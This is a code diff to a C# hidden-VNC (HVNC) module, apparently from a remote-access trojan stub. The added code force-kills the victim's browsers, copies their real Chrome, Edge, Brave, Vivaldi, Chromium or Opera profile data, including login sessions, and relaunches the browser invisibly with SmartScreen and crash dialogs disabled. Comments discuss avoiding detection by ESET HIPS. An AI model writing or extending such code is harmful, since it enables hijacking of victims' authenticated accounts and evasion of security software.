@@ -390,8 +390,10 @@ internal static class HvncFeature
         // TerminateProcess on a browser looks like a crash to ESET HIPS, which then blocks the
         // browser's profile directory on the next real-desktop launch.
         const uint PT = 0x0001; // PROCESS_TERMINATE
-        bool launchedOpera = _launchedPids.ContainsKey("opera.exe");
-        bool launchedEdge  = _launchedPids.ContainsKey("msedge.exe");
+        bool launchedOpera  = _launchedPids.ContainsKey("opera.exe");
+        bool launchedEdge   = _launchedPids.ContainsKey("msedge.exe");
+        bool launchedChrome = _launchedPids.ContainsKey("chrome.exe");
+        bool launchedBrave  = _launchedPids.ContainsKey("brave.exe");
         GracefulKillBrowsers();
         foreach (var pid in _launchedPids.Values)
         {
@@ -407,8 +409,10 @@ internal static class HvncFeature
         CleanChromiumHvncLocks();
 
         // Repair real Opera profile: fix wrong path bug + repair corrupted JSON files.
-        if (launchedOpera) RepairOperaProfileAfterHvnc();
-        if (launchedEdge)  CleanRealBrowserLock("Microsoft", "Edge");
+        if (launchedOpera)  RepairOperaProfileAfterHvnc();
+        if (launchedEdge)   CleanRealBrowserLock("Microsoft",   "Edge",             "User Data");
+        if (launchedChrome) CleanRealBrowserLock("Google",      "Chrome",           "User Data");
+        if (launchedBrave)  CleanRealBrowserLock("BraveSoftware","Brave-Browser",   "User Data");
     }
 
     public static void SignalAck()
@@ -1590,6 +1594,37 @@ internal static class HvncFeature
         }
     }
 
+    private static string? GetChromiumRealProfile(string exeBase)
+    {
+        string local  = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        return exeBase.ToLowerInvariant() switch
+        {
+            "chrome.exe"   => Path.Combine(local,   "Google",           "Chrome",         "User Data"),
+            "msedge.exe"   => Path.Combine(local,   "Microsoft",        "Edge",           "User Data"),
+            "brave.exe"    => Path.Combine(local,   "BraveSoftware",    "Brave-Browser",  "User Data"),
+            "vivaldi.exe"  => Path.Combine(local,   "Vivaldi",          "User Data"),
+            "chromium.exe" => Path.Combine(local,   "Chromium",         "User Data"),
+            "opera.exe"    => Path.Combine(roaming, "Opera Software",   "Opera Stable"),
+            _ => null
+        };
+    }
+
+    private static void CloneProfileToDir(string src, string dst)
+    {
+        if (!Directory.Exists(src)) return;
+        Directory.CreateDirectory(dst);
+        foreach (var dir in Directory.EnumerateDirectories(src, "*", SearchOption.AllDirectories))
+            try { Directory.CreateDirectory(dir.Replace(src, dst)); } catch { }
+        foreach (var file in Directory.EnumerateFiles(src, "*", SearchOption.AllDirectories))
+        {
+            try { File.Copy(file, file.Replace(src, dst), overwrite: true); }
+            catch (IOException) { }
+            catch (UnauthorizedAccessException) { }
+            catch { }
+        }
+    }
+
     private static void KillProcessByName(string exeName)
     {
         const uint TH32CS_SNAPPROCESS = 0x00000002;
@@ -1808,10 +1843,25 @@ internal static class HvncFeature
             {
                 string hvncProfile = Path.Combine(Path.GetTempPath(), "SeroHvnc",
                     Path.GetFileNameWithoutExtension(exeBase));
-                try { Directory.CreateDirectory(hvncProfile); } catch { }
-                // Delete any stale singleton lock before launching so browser doesn't show error
+                string? realProfile = GetChromiumRealProfile(exeBase);
+                if (realProfile != null && Directory.Exists(realProfile))
+                {
+                    // Kill real instance to release file locks, then clone fresh profile
+                    KillProcessByName(exeBase);
+                    Thread.Sleep(500);
+                    try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, recursive: true); } catch { }
+                    CloneProfileToDir(realProfile, hvncProfile);
+                    StubLog.Info($"[HVNC] Profile cloned '{realProfile}' → '{hvncProfile}'");
+                }
+                else
+                {
+                    try { Directory.CreateDirectory(hvncProfile); } catch { }
+                }
                 foreach (var lk in new[] { "SingletonLock", "SingletonSocket", "SingletonCookie" })
+                {
                     try { File.Delete(Path.Combine(hvncProfile, lk)); } catch { }
+                    try { File.Delete(Path.Combine(hvncProfile, "Default", lk)); } catch { }
+                }
                 cmd += $" --user-data-dir=\"{hvncProfile}\"" +
                        " --start-maximized" +
                        " --no-first-run --no-default-browser-check --disable-default-apps" +
@@ -1819,11 +1869,9 @@ internal static class HvncFeature
                        " --noerrdialogs --disable-session-crashed-bubble" +
                        " --disable-restore-session-state --disable-crash-reporter" +
                        " --no-recovery-component";
-                // Edge-specific: suppress update nag, crash recovery, and first-run sync dialogs
                 if (exeBase == "msedge.exe")
                     cmd += " --disable-features=msEdgeRecovery,msSmartScreenProtection" +
                            " --disable-sync --hide-crash-restore-bubble";
-                // Opera-specific: suppress crash recovery dialog
                 if (exeBase == "opera.exe")
                     cmd += " --disable-features=OperaCrashRestoreSession";
             }
@@ -1833,9 +1881,8 @@ internal static class HvncFeature
                 // Both share %APPDATA%\Telegram Desktop\ → HVNC instance inherits user theme (dark mode).
                 cmd += " -many";
             }
-            // Clean real Opera profile before launch so the "erreur de profil" popup never appears.
-            // RepairOperaProfileAfterHvnc() also runs on Stop(), but if a previous session left the
-            // profile corrupted before this fix existed, the repair must happen before the next launch.
+            // Repair real Opera profile JSON before launch (registry ATTEMPTS counter + corrupted JSON).
+            // The HVNC temp profile is always re-cloned fresh above, so this only touches the real profile.
             if (exeBase == "opera.exe") RepairOperaProfileAfterHvnc();
 
             var sb = new System.Text.StringBuilder(cmd);
